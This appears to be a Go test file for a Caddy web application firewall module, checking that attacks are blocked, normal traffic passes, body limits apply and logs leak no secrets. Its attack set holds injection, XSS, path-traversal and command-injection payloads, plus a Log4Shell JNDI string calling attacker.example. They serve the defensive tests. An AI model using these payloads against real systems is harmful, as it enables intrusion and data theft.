package waf

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/caddyserver/caddy/v2/modules/caddyhttp"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"go.uber.org/zap/zaptest/observer"

	"github.com/TheAlsaadi/SoireeHost/internal/fwevent"
)

var (
	wafOnce sync.Once
	wafs    = map[string]*Firewall{}
	errWAF  error
)

// testFirewall returns a handler for mode and level whose events go to the
// returned observer. WAFs are built once per test binary.
func testFirewall(t *testing.T, mode string, level int) (*Firewall, *observer.ObservedLogs) {
	t.Helper()
	wafOnce.Do(func() {
		for _, m := range []string{ModeBlock, ModeDetect} {
			for l := 1; l <= 4; l++ {
				d, err := directives(m, l)
				if err != nil {
					errWAF = err
					return
				}
				w, err := NewWAF(d)
				if err != nil {
					errWAF = fmt.Errorf("%s/%d: %w", m, l, err)
					return
				}
				wafs[fmt.Sprintf("%s-%d", m, l)] = &Firewall{Site: "blog", Mode: m, ParanoiaLevel: l, waf: w}
			}
		}
	})
	if errWAF != nil {
		t.Fatal(errWAF)
	}
	core, logs := observer.New(zapcore.DebugLevel)
	f := *wafs[fmt.Sprintf("%s-%d", mode, level)]
	f.logger = zap.New(core)
	return &f, logs
}

// serve runs one request through the handler in front of a handler that
// answers 200 and echoes the body length it saw.
func serve(f *Firewall, r *http.Request) (int, string) {
	rec := httptest.NewRecorder()
	next := caddyhttp.HandlerFunc(func(w http.ResponseWriter, r *http.Request) error {
		n, _ := io.Copy(io.Discard, r.Body)
		_, _ = fmt.Fprintf(w, "ok %d", n)
		return nil
	})
	err := f.ServeHTTP(rec, r, next)
	if err != nil {
		var he caddyhttp.HandlerError
		if ok := asHandlerError(err, &he); ok {
			return he.StatusCode, he.Err.Error()
		}
		return 500, err.Error()
	}
	return rec.Code, rec.Body.String()
}

func asHandlerError(err error, he *caddyhttp.HandlerError) bool {
	h, ok := err.(caddyhttp.HandlerError) //nolint:errorlint // caddyhttp.Error returns the value type
	if ok {
		*he = h
	}
	return ok
}

const chromeUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"

func browserGet(target string) *http.Request {
	r := httptest.NewRequestWithContext(context.Background(), http.MethodGet, target, nil)
	r.Host = "blog.example.com"
	r.Header.Set("User-Agent", chromeUA)
	r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	r.Header.Set("Accept-Language", "en-GB,en;q=0.9,ar;q=0.8")
	r.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	r.Header.Set("Cookie", "theme=dark; session=4f2c9a1e7b")
	r.Header.Set("Referer", "https://blog.example.com/")
	r.Header.Set("Sec-Fetch-Mode", "navigate")
	r.Header.Set("Cf-Connecting-Ip", "203.0.113.7")
	return r
}

func apiRequest(method, target, contentType, body string) *http.Request {
	r := httptest.NewRequestWithContext(context.Background(), method, target, strings.NewReader(body))
	r.Host = "blog.example.com"
	r.Header.Set("User-Agent", chromeUA)
	r.Header.Set("Accept", "application/json")
	if contentType != "" {
		r.Header.Set("Content-Type", contentType)
	}
	if body == "" {
		r.Body = http.NoBody
		r.ContentLength = 0
	}
	return r
}

// attackSet is the TEST_PLAN fixed attack set: each must get 403 at
// paranoia level 1 in Block mode, and appear in the firewall log.
func attackSet() map[string]*http.Request {
	set := map[string]*http.Request{}
	add := func(name string, r *http.Request) { set[name] = r }
	add("sqli union", browserGet("/item?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"))
	add("sqli boolean", browserGet("/item?id=1%27%20OR%20%271%27=%271"))
	add("sqli sleep", browserGet("/search?q=1)%20AND%20SLEEP(5)%23"))
	add("sqli in form", apiRequest(http.MethodPost, "/login", "application/x-www-form-urlencoded",
		"user=admin%27--&pass=x"))
	add("sqli in json", apiRequest(http.MethodPost, "/api/items", "application/json",
		`{"name":"x' OR 1=1 --","qty":1}`))
	add("xss script tag", browserGet("/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"))
	add("xss img onerror", browserGet("/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"))
	add("xss javascript uri", browserGet("/go?url=javascript:alert(1)"))
	add("xss in form", apiRequest(http.MethodPost, "/comment", "application/x-www-form-urlencoded",
		"body=%3Csvg%2Fonload%3Dalert%281%29%3E"))
	add("traversal etc passwd", browserGet("/download?file=../../../../etc/passwd"))
	add("traversal windows", browserGet("/download?file=..%5C..%5C..%5Cwindows%5Cwin.ini"))
	add("traversal encoded", browserGet("/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini"))
	add("rce command", browserGet("/ping?host=127.0.0.1%3Bcat%20/etc/passwd"))
	add("php injection", browserGet("/index.php?page=php://filter/convert.base64-encode/resource=index"))
	add("log4shell", func() *http.Request {
		r := browserGet("/")
		r.Header.Set("X-Api-Version", "${jndi:ldap://attacker.example/a}")
		return r
	}())
	for _, ua := range []string{"sqlmap/1.8.11#stable (https://sqlmap.org)", "Nikto/2.5.0", "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007614)", "nuclei - open-source project (github.com/projectdiscovery/nuclei)"} {
		r := browserGet("/")
		r.Header.Set("User-Agent", ua)
		add("scanner "+strings.Fields(ua)[0], r)
	}
	return set
}

// normalSet is the TEST_PLAN fixed normal set: a static site, a typical JSON
// API, form posts and a file upload under the limit, which must all pass at
// paranoia level 1 in Block mode.
func normalSet(t *testing.T) map[string]*http.Request {
	set := map[string]*http.Request{}
	for _, p := range []string{"/", "/index.html", "/about/", "/blog/2026/11/hello-world.html", "/css/site.css?v=3",
		"/js/app.js", "/img/logo.png", "/fonts/inter.woff2", "/favicon.ico", "/sitemap.xml", "/feed.atom",
		"/search?q=how+to+self-host+a+site", "/tags/caf%C3%A9", "/search?q=O%27Reilly+books&page=2",
		"/docs/select-from-the-menu.html", "/?utm_source=newsletter&utm_medium=email"} {
		set["static GET "+p] = browserGet(p)
	}
	set["api list"] = apiRequest(http.MethodGet, "/api/items?limit=20&offset=40&sort=-created_at", "", "")
	set["api get"] = apiRequest(http.MethodGet, "/api/items/42", "", "")
	set["api create"] = apiRequest(http.MethodPost, "/api/items", "application/json",
		`{"name":"Blue mug","price":12.5,"tags":["kitchen","gift"],"note":"Ships in 2-3 days; handle with care."}`)
	set["api replace"] = apiRequest(http.MethodPut, "/api/items/42", "application/json", `{"name":"Red mug","price":13}`)
	set["api patch"] = apiRequest(http.MethodPatch, "/api/items/42", "application/merge-patch+json", `{"price":14}`)
	set["api delete"] = apiRequest(http.MethodDelete, "/api/items/42", "", "")
	set["api options"] = apiRequest(http.MethodOptions, "/api/items", "", "")
	set["api graphql"] = apiRequest(http.MethodPost, "/graphql", "application/json",
		`{"query":"query Items($n: Int) { items(first: $n) { id name } }","variables":{"n":10}}`)
	set["form login"] = apiRequest(http.MethodPost, "/login", "application/x-www-form-urlencoded",
		"username=sara&password=C0rrect+Horse%21Battery%23Staple&remember=on")
	set["form contact"] = apiRequest(http.MethodPost, "/contact", "application/x-www-form-urlencoded",
		"name=Ahmed+Ali&email=ahmed%40example.com&message=Hello%2C+I%27d+like+to+book+a+table+for+4+on+Friday.")
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	_ = mw.WriteField("title", "Holiday photo")
	fw, err := mw.CreateFormFile("photo", "beach.png")
	if err != nil {
		t.Fatal(err)
	}
	png := append([]byte("\x89PNG\r\n\x1a\n"), bytes.Repeat([]byte{0, 1, 2, 3, 250, 251, 252, 253}, 64<<10)...)
	_, _ = fw.Write(png)
	_ = mw.Close()
	up := apiRequest(http.MethodPost, "/upload", mw.FormDataContentType(), buf.String())
	set["form upload 512 KB"] = up
	return set
}

func TestAttackSetBlocked(t *testing.T) {
	for name, r := range attackSet() {
		t.Run(name, func(t *testing.T) {
			f, logs := testFirewall(t, ModeBlock, 1)
			code, _ := serve(f, r)
			if code != http.StatusForbidden {
				t.Fatalf("got %d, want 403", code)
			}
			evs := events(t, logs)
			if len(evs) != 1 {
				t.Fatalf("got %d firewall events, want 1", len(evs))
			}
			ev := evs[0]
			if ev.Action != fwevent.ActionBlocked || ev.Status != 403 || ev.Site != "blog" || len(ev.Rules) == 0 {
				t.Fatalf("event = %+v", ev)
			}
		})
	}
}

func TestNormalSetPasses(t *testing.T) {
	for name, r := range normalSet(t) {
		t.Run(name, func(t *testing.T) {
			f, logs := testFirewall(t, ModeBlock, 1)
			code, body := serve(f, r)
			if code != http.StatusOK {
				t.Fatalf("got %d (%s), want 200; rules: %v", code, body, ruleIDs(events(t, logs)))
			}
			if n := logs.Len(); n != 0 {
				t.Fatalf("a normal request wrote %d firewall events: %v", n, ruleIDs(events(t, logs)))
			}
		})
	}
}

// TestUploadBodyReachesSite: the body the firewall inspected reaches the site
// whole.
func TestUploadBodyReachesSite(t *testing.T) {
	f, _ := testFirewall(t, ModeBlock, 1)
	r := normalSet(t)["form upload 512 KB"]
	want := r.ContentLength
	code, body := serve(f, r)
	if code != 200 || body != fmt.Sprintf("ok %d", want) {
		t.Fatalf("got %d %q, want 200 \"ok %d\"", code, body, want)
	}
}

func TestDetectOnlyLogsButPasses(t *testing.T) {
	for name, r := range attackSet() {
		t.Run(name, func(t *testing.T) {
			f, logs := testFirewall(t, ModeDetect, 1)
			if code, _ := serve(f, r); code != http.StatusOK {
				t.Fatalf("Detect only answered %d, want the site's 200", code)
			}
			evs := events(t, logs)
			if len(evs) != 1 || evs[0].Action != fwevent.ActionDetected || evs[0].Status != 0 {
				t.Fatalf("events = %+v", evs)
			}
		})
	}
}

func TestEveryLevelBuildsAndBlocks(t *testing.T) {
	for l := 1; l <= 4; l++ {
		f, _ := testFirewall(t, ModeBlock, l)
		if code, _ := serve(f, browserGet("/search?q=%3Cscript%3Ealert(1)%3C/script%3E")); code != 403 {
			t.Fatalf("level %d: got %d, want 403", l, code)
		}
	}
}

// TestLargeBody: in Block mode a body over InspectBytes, or with more than
// TextInspectBytes of text, is refused with 413 (owner decisions of 15 Nov
// 2026); in Detect only both pass whole.
func TestLargeBody(t *testing.T) {
	bigFile := multipartBody(t, nil, map[string]int{"video.bin": int(InspectBytes) + 1024})
	for _, tc := range []struct {
		name, ct, body string
		rule           int
	}{
		{"text over 128 KB", "application/json", `{"a":"` + strings.Repeat("a", int(TextInspectBytes)) + `"}`, RuleTextLimit},
		{"octet stream over 128 KB", "application/octet-stream", strings.Repeat("a", int(TextInspectBytes)+1), RuleTextLimit},
		{"multipart text field over 128 KB", "", "", RuleTextLimit},
		{"multipart over 16 MB", bigFile.ct, bigFile.body, RuleBodyLimit},
	} {
		if tc.ct == "" {
			mp := multipartBody(t, map[string]string{"essay": strings.Repeat("words ", int(TextInspectBytes)/5)}, nil)
			tc.ct, tc.body = mp.ct, mp.body
		}
		t.Run(tc.name, func(t *testing.T) {
			f, logs := testFirewall(t, ModeBlock, 1)
			if code, _ := serve(f, apiRequest(http.MethodPost, "/upload", tc.ct, tc.body)); code != 413 {
				t.Fatalf("Block: got %d, want 413", code)
			}
			evs := events(t, logs)
			if len(evs) != 1 || evs[0].Status != 413 || len(evs[0].Rules) == 0 || evs[0].Rules[0].ID != tc.rule {
				t.Fatalf("Block: events = %+v", evs)
			}
			d, _ := testFirewall(t, ModeDetect, 1)
			start := time.Now()
			code, body := serve(d, apiRequest(http.MethodPost, "/upload", tc.ct, tc.body))
			if code != 200 || body != fmt.Sprintf("ok %d", len(tc.body)) {
				t.Fatalf("Detect only: got %d %q, want the whole body", code, body)
			}
			if el := time.Since(start); el > 20*time.Second {
				t.Fatalf("Detect only took %v: the text limit is not applied", el)
			}
		})
	}
}

// TestLargeFileUploadPasses: a 15 MB file with small text fields is fully
// inspected and passes quickly, because file contents are not scanned as
// text.
func TestLargeFileUploadPasses(t *testing.T) {
	f, logs := testFirewall(t, ModeBlock, 1)
	mp := multipartBody(t, map[string]string{"title": "Holiday video", "album": "2026"}, map[string]int{"clip.mp4": 15 << 20})
	start := time.Now()
	code, body := serve(f, apiRequest(http.MethodPost, "/upload", mp.ct, mp.body))
	if code != 200 || body != fmt.Sprintf("ok %d", len(mp.body)) {
		t.Fatalf("got %d %q; rules %v", code, body, ruleIDs(events(t, logs)))
	}
	if el := time.Since(start); el > 10*time.Second {
		t.Fatalf("a 15 MB upload took %v to inspect", el)
	}
}

func TestInspectionSlots(t *testing.T) {
	n := int64(max(2, runtime.NumCPU()/2))
	if !slots.TryAcquire(n) {
		t.Fatal("slots not free at the start")
	}
	old := inspectWait
	inspectWait = 50 * time.Millisecond
	defer func() { inspectWait = old }()
	f, _ := testFirewall(t, ModeBlock, 1)
	code, _ := serve(f, browserGet("/"))
	slots.Release(n)
	if code != http.StatusServiceUnavailable {
		t.Fatalf("got %d with every slot taken, want 503", code)
	}
	if code, _ := serve(f, browserGet("/")); code != 200 {
		t.Fatalf("after release: got %d", code)
	}
}

func TestMultipartTextCount(t *testing.T) {
	small := multipartBody(t, map[string]string{"a": "short", "b": strings.Repeat("x", 1000)}, map[string]int{"f.bin": 1 << 20})
	if over := multipartTextOver(strings.NewReader(small.body), boundaryOf(t, small.ct)); over {
		t.Fatal("small text fields counted as over the limit")
	}
	big := multipartBody(t, map[string]string{"a": strings.Repeat("x", int(TextInspectBytes)+1)}, nil)
	if !multipartTextOver(strings.NewReader(big.body), boundaryOf(t, big.ct)) {
		t.Fatal("a large text field was not counted")
	}
	if !multipartTextOver(strings.NewReader("--x"+string(rune(13))+string(rune(10))+"not a part"), "x") {
		t.Fatal("a body that cannot be parsed must count as over the limit")
	}
}

type mpBody struct{ ct, body string }

func multipartBody(t *testing.T, fields map[string]string, files map[string]int) mpBody {
	t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	for k, v := range fields {
		if err := mw.WriteField(k, v); err != nil {
			t.Fatal(err)
		}
	}
	for name, size := range files {
		fw, err := mw.CreateFormFile("file", name)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = fw.Write(bytes.Repeat([]byte{0x00, 0x9f, 0x41, 0xee}, size/4))
	}
	if err := mw.Close(); err != nil {
		t.Fatal(err)
	}
	return mpBody{ct: mw.FormDataContentType(), body: buf.String()}
}

func boundaryOf(t *testing.T, ct string) string {
	t.Helper()
	b, ok := multipartBoundary(ct)
	if !ok {
		t.Fatalf("no boundary in %q", ct)
	}
	return b
}

func TestBodyBudget(t *testing.T) {
	if !budget.TryAcquire(BodyBudget) {
		t.Fatal("budget not free at the start")
	}
	f, _ := testFirewall(t, ModeBlock, 1)
	code, _ := serve(f, apiRequest(http.MethodPost, "/api/items", "application/json", `{"a":1}`))
	budget.Release(BodyBudget)
	if code != http.StatusServiceUnavailable {
		t.Fatalf("got %d with the budget exhausted, want 503", code)
	}
	if code, _ := serve(f, apiRequest(http.MethodGet, "/api/items", "", "")); code != 200 {
		t.Fatalf("a request without a body got %d", code)
	}
	if code, _ := serve(f, apiRequest(http.MethodPost, "/api/items", "application/json", `{"a":1}`)); code != 200 {
		t.Fatalf("after release: got %d", code)
	}
}

// TestEventsHoldNoSecrets: no header, cookie, body, query value or matched
// value reaches a firewall event (S-18, S-40).
func TestEventsHoldNoSecrets(t *testing.T) {
	const canary = "CANARYc4n4ry"
	r := apiRequest(http.MethodPost, "/login?token="+canary+"&q=%3Cscript%3Ealert(1)%3C/script%3E"+canary+"&"+canary+"x",
		"application/x-www-form-urlencoded", "password="+canary+"&comment=%3Cscript%3E"+canary+"%3C/script%3E")
	r.Header.Set("Authorization", "Bearer "+canary)
	r.Header.Set("Cookie", "session="+canary)
	r.Header.Set("User-Agent", "sqlmap/1.8 "+canary)
	r.Header.Set("X-"+canary, "1")
	for _, mode := range []string{ModeBlock, ModeDetect} {
		f, logs := testFirewall(t, mode, 1)
		serve(f, r.Clone(r.Context()))
		body := r.Clone(r.Context())
		body.Body = io.NopCloser(strings.NewReader("password=" + canary + "&comment=%3Cscript%3E" + canary + "%3C/script%3E"))
		serve(f, body)
		if logs.Len() == 0 {
			t.Fatalf("%s: no event written", mode)
		}
		for _, e := range logs.All() {
			b, err := json.Marshal(e.ContextMap())
			if err != nil {
				t.Fatal(err)
			}
			if bytes.Contains(bytes.ToLower(b), []byte(strings.ToLower(canary))) {
				t.Fatalf("%s: canary in event: %s", mode, b)
			}
		}
	}
}

// TestCRSVersionMatchesLock keeps CRSVersion equal to build/crs.lock.
func TestCRSVersionMatchesLock(t *testing.T) {
	f, err := os.Open(filepath.Join("..", "..", "build", "crs.lock"))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close() //nolint:errcheck // read-only
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if v, ok := strings.CutPrefix(sc.Text(), "version="); ok {
			if v != CRSVersion {
				t.Fatalf("crs.lock has %s, CRSVersion is %s", v, CRSVersion)
			}
			return
		}
	}
	t.Fatal("no version in crs.lock")
}

// TestEmbeddedRulesHaveNoResponseRules: the response rules and their data
// files are not vendored (ADR-0008).
func TestEmbeddedRulesHaveNoResponseRules(t *testing.T) {
	ents, err := vendored.ReadDir("crs/rules")
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range ents {
		n := e.Name()
		if strings.HasPrefix(n, "RESPONSE-") || strings.HasPrefix(n, "web-shells") || strings.HasSuffix(n, "-errors.data") {
			t.Fatalf("response rule file vendored: %s", n)
		}
	}
	if len(ents) < 20 {
		t.Fatalf("only %d rule files embedded", len(ents))
	}
}

func TestDirectivesRefuseBadInput(t *testing.T) {
	for _, tc := range []struct {
		mode  string
		level int
	}{{"off", 1}, {"", 1}, {"On", 1}, {ModeBlock, 0}, {ModeBlock, 5}, {ModeDetect, -1}} {
		if _, err := directives(tc.mode, tc.level); err == nil {
			t.Fatalf("directives(%q, %d) accepted", tc.mode, tc.level)
		}
	}
}

func events(t *testing.T, logs *observer.ObservedLogs) []fwevent.Event {
	t.Helper()
	var out []fwevent.Event
	for _, e := range logs.All() {
		if e.Message != fwevent.LogMessage {
			t.Fatalf("unexpected log message %q", e.Message)
		}
		ev, ok := e.ContextMap()["event"].(fwevent.Event)
		if !ok {
			t.Fatalf("event field is %T", e.ContextMap()["event"])
		}
		if err := ev.Validate(); err != nil {
			t.Fatalf("written event does not validate: %v (%+v)", err, ev)
		}
		out = append(out, ev)
	}
	return out
}

func ruleIDs(evs []fwevent.Event) []int {
	var ids []int
	for _, e := range evs {
		for _, r := range e.Rules {
			ids = append(ids, r.ID)
		}
	}
	return ids
}

// Pre-merge review finding: a body still arriving from the network holds
// no inspection slot, so slow uploads cannot starve other requests.
func TestSlowBodyHoldsNoSlot(t *testing.T) {
	f, _ := testFirewall(t, ModeBlock, 1)
	pr, pw := io.Pipe()
	r := apiRequest(http.MethodPost, "/api/items", "application/json", "x")
	r.Body, r.ContentLength = pr, -1
	done := make(chan int)
	go func() {
		code, _ := serve(f, r)
		done <- code
	}()
	_, _ = pw.Write([]byte(`{"a":`))
	time.Sleep(200 * time.Millisecond)
	n := int64(max(2, runtime.NumCPU()/2))
	if !slots.TryAcquire(n) {
		t.Fatal("a request waiting for its body holds an inspection slot")
	}
	slots.Release(n)
	_, _ = pw.Write([]byte(`1}`))
	_ = pw.Close()
	if code := <-done; code != http.StatusOK {
		t.Fatalf("got %d", code)
	}
}
